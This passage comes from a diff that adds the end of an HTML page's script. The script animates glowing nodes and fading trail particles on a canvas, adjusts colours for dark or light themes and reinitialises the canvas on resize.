+                `rgba(${colorRGB}, 0.3)`
+            );
+
+            g.addColorStop(
+                1,
+                "transparent"
+            );
+
+
+            ctx.fillStyle = g;
+
+            ctx.beginPath();
+
+            ctx.arc(
+                node.x,
+                node.y,
+                node.size,
+                0,
+                Math.PI * 2
+            );
+
+            ctx.fill();
+
+        }
+    );
+
+
+    ctx.globalCompositeOperation =
+        "source-over";
+
+
+    const particleRGB =
+        isDark
+            ? "255, 255, 255"
+            : "0, 0, 0";
+
+
+    trailParticles.forEach(
+        (p, i) => {
+
+            p.update();
+
+            p.draw(
+                particleRGB
+            );
+
+            if (
+                p.life <= 0
+            ) {
+                trailParticles.splice(
+                    i,
+                    1
+                );
+            }
+        }
+    );
+
+
+    requestAnimationFrame(
+        draw
+    );
+}
+
+
+window.addEventListener(
+    'resize',
+    initCanvas
+);
+
+initCanvas();
+
+draw();
+
+</script>
+
+</body>
+
+</html>
